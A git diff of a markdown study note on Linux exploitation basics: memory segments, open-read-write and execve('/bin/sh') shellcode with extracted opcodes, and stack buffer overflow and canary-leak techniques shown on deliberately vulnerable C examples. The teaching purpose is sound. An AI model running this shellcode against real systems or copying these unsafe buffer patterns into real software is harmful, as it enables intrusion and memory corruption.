@@ -6,27 +6,27 @@ Reminding system hacking basic things.
 Linux: Divide process's memory into largely 5 segments -> (code, data, bss, heap, stack)
 
 ### Code
-Segment for 'exeuctable' machine code. Also known as Text Segment. 
+Segment for 'exeuctable' machine code. Also known as Text Segment. <br>
 Doesn't have execute capability in most cases. 
 
-### Data
-Segment for global variables and constants whose values are already fixed during compile.
+### Data 
+Segment for global variables and constants whose values are already fixed during compile. <br>
 Usually have read capability. Data segment is again divided into two segments: writable, nonwritable
 
 Writable: data segment
 Non writable: rodata segment 
 
 ### Bss
-Segment for global variables and constants whose values are not fixed yet during compile.
-When program starts, this segment is initialized with zero.  
+Segment for global variables and constants whose values are not fixed yet during compile.<br>
+When program starts, this segment is initialized with zero.  <br>
 Usually have 'read', 'write'.
 
 ### Stack
-Segment for temporary variables such as parameter for functions and local variables. 
+Segment for temporary variables such as parameter for functions and local variables.  <br>
 Usually used in units called 'stack frames'. Grows toward 'low address'.
 
 ### Heap 
-Segment for heap data. Dynamically allocated during runtime. 
+Segment for heap data. Dynamically allocated during runtime. <br>
 Usually has 'read', 'write'. 
 
 ## Shell code
@@ -34,7 +34,7 @@ If attacker can controll rip, attacker can execute arbitrary assembly code.
 
 ### ORW shell code
 
-Bellow C code is pseudo code that shows what shell code does.
+Bellow C code is pseudo code that shows what shell code does. 
 
 ```
 char buf[0x30];
@@ -44,20 +44,20 @@ read(fd, buf, 0x30);
 write(1, buf, 0x30);
 ```
 
-syscall rax arg0(rdi)         arg1(rsi) arg2(rdx)
-read    0x0 unsigned int fd   char *buf size_t count
-write   0x1 unsigned int fd   char *buf size_t count
-open    0x2 char *filename    int flag  umode_t mode
+syscall rax arg0(rdi)         arg1(rsi) arg2(rdx) <br>
+read    0x0 unsigned int fd   char *buf size_t count <br>
+write   0x1 unsigned int fd   char *buf size_t count <br>
+open    0x2 char *filename    int flag  umode_t mode <br>
 
 #### 1. int fd = open("/tmp/flag", RD_ONLY, NULL)
-First, string "/tmp/flag" should be on the memory. -> push
-But, push operation works in units of 8 bytes. So, push 0x67, then push 0x616c662f706d742f.
+First, string "/tmp/flag" should be on the memory. -> push <br>
+But, push operation works in units of 8 bytes. So, push 0x67, then push 0x616c662f706d742f. <br>
 
-"/tmp/flag" in little endian: 0x67616c662f706d742f
+"/tmp/flag" in little endian: 0x67616c662f706d742f <br>
 
-O_RDONLY = 0 -> set rsi 0
-mode -> meaningless, set rdx 0
-rax -> 0x2(open)
+O_RDONLY = 0 -> set rsi 0 <br>
+mode -> meaningless, set rdx 0 <br>
+rax -> 0x2(open) <br>
 
 ```
 push 0x67
@@ -71,7 +71,7 @@ syscall         ; open("/tmp/flag", RD_ONLY, NULL)
 ```
 
 #### 2. read(fd, buf, 0x30)
-File descriptor number obtained by 'open' goes to rax. So, 'mov rdi, rax'
+File descriptor number obtained by 'open' goes to rax. So, 'mov rdi, rax' <br>
 ```
 mov rdi, rax      ; rdi = fd
 mov rsi, rsp
@@ -82,8 +82,8 @@ syscall           ; read(fd, buf, 0x30)
 ```
 
 #### 3. write(1, buf, 0x30)
-standard output(stdout) -> set rdi 0x1
-rsi, rdx stays same
+standard output(stdout) -> set rdi 0x1 <br>
+rsi, rdx stays same <br>
 
 ```
 mov rdi, 1        ; rdi = 1 ; fd = stdout
@@ -91,7 +91,7 @@ mov rax, 0x1      ; rax = 1 ; syscall_write
 syscall           ; write(fd, buf, 0x30)
 ```
 
-How to compile into ELF
+How to compile into ELF 
 ```
 // Compile: gcc -o orw orw.c -masm=intel
 
@@ -130,9 +130,9 @@ int main() { run_sh(); }
 
 ### execve shell code
 
-Only uses execve systemcall: execve("/bin/sh",null,null)
+Only uses execve systemcall: execve("/bin/sh",null,null) <br>
 
-syscall rax   arg0(rdi)         arg1(rsi)    arg2(rdx)
+syscall rax   arg0(rdi)         arg1(rsi)    arg2(rdx) <br>
 execve  0x3b  char *filename    char *argv   char *const *envp
 
 ```
@@ -147,7 +147,7 @@ syscall       ; execve("/bin/sh", null, null)
 
 ### How to extract shell code
 
-How to extract shellcode in the form of byte code(opcode)
+How to extract shellcode in the form of byte code(opcode) 
 
 ```
 $ objdump -d shellcode.o
@@ -173,4 +173,147 @@ $ xxd shellcode.bin
 00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
 00000010: c931 d2b0 0bcd 80                        .1.....
 ```
+
+## Stack buffer overflow
+
+buffer: temporary data storage <br>
+
+Buffer overflow: happens when bigger data than the size of buffer goes into it.
+
+### 1. modification of data
+
+```
+int check_auth(char *password) {
+    int auth = 0;
+    char temp[16];
+    
+    strncpy(temp, password, strlen(password));
+    
+    if(!strcmp(temp, "SECRET_PASSWORD"))
+        auth = 1;
+    
+    return auth;
+}
+```
+
+If 'password' is longer than 16 byte -> buffer overflow <br>
+
+'auth' variable is located behind 'temp' buffer, so if an overflow occurs <br>
+value of auth can be tampered.
+
+### 2. Data leak
+
+In C language, normal string terminates with null byte. <br>
+If we can overwrite null byte using buffer overflow, it can lead to data leakage.
+
+```
+char secret[16] = "secret message";
+char barrier[4] = {};
+char name[8] = {};
+memset(barrier, 0, 4);
+printf("Your name: ");
+read(0, name, 12);
+printf("Your name is %s.", name);
+```
+
+### 3. Control flow manipulation
+
+When caller calls callee, it pushes return address. When callee returns, it pops the return address and jumps. <br>
+With buffer overflow, return address can be modified.
+
+```
+void win() {
+    printf("You won!\n");
+}
+
+int main(void) {
+    char buf[8];
+    printf("Overwrite return address with %p:\n", &win);
+    read(0, buf, 32);
+    return 0;
+}
+```
+
+buf + saved_rbp(8byte) + ret(8byte) -> can overwrite return address
+
+## Stack Canary
+
+Stack canary: Inserts random value between stack buffer and return address. In the function's epilogue, <br>
+it checks for any modification of this value. If altered, process is terminated.
+
+```
++  mov    rax,QWORD PTR fs:0x28
++  mov    QWORD PTR [rbp-0x8],rax
++  xor    eax,eax
++  lea    rax,[rbp-0x10]
+-  lea    rax,[rbp-0x8]
+   mov    edx,0x20
+   mov    rsi,rax
+   mov    edi,0x0
+   call   read@plt
+   mov    eax,0x0
++  mov    rcx,QWORD PTR [rbp-0x8]
++  xor    rcx,QWORD PTR fs:0x28
++  je     0x6f0 <main+70>
++  call   __stack_chk_fail@plt
+```
+
+### Canary dynamic analysis
+
+#### Canary insertion
+
+```
+pwndbg> ni
+   0x5555555546b2 <main+8>     mov    rax, qword ptr fs:[0x28] <0x5555555546aa>
+   0x5555555546bb <main+17>    mov    qword ptr [rbp - 8], rax
+ ► 0x5555555546bf <main+21>    xor    eax, eax
+pwndbg> x/gx $rbp-0x8
+0x7fffffffe238:	0xf80f605895da3c00
+```
+
+Fetch data from **fs:0x28** and save it to **rbp-0x8** <br>
+ 
+fs: Linux uses fs(segment register) as a pointer to TLS(Thread Local Storage). <br>
+TLS: Saves various data that are required when executing process(including canary)
+
+#### Canary check
+
+```
+0x5555555546dc <main+50>    mov    rcx, qword ptr [rbp - 8] <0x7ffff7af4191>
+0x5555555546e0 <main+54>    xor    rcx, qword ptr fs:[0x28]
+0x5555555546e9 <main+63>    je     main+70 <main+70>
+0x5555555546eb <main+65>    call   __stack_chk_fail@plt <__stack_chk_fail@plt>
+```
+
+xor two values: data from **rbp-0x8** and data from **fs:0x28** <br>
+If the two values are not same: **__stack_chk_fail** and terminate 
+
+### Canary bypass
+
+#### TLS read, write
+
+Address of TLS changes everytime. But, if approach to TLS is possible during runtime, reading canary value or <br>
+overwriting canary is possible. 
+
+#### Canary leak
+
+```
+int main() {
+  char memo[8];
+  char name[8];
+  
+  printf("name : ");
+  read(0, name, 64);
+  printf("hello %s\n", name);
+  
+  printf("memo : ");
+  read(0, memo, 64);
+  printf("memo %s\n", memo);
+  return 0;
+} 
+```
+
+**name** buffer overflow -> overwrite 1 byte(null byte) of canary -> canary leak <br>
+
+With this canary value, overwriting name(8byte) + canary(8byte) + rbp(8byte) + ret(8byte) is possible
 
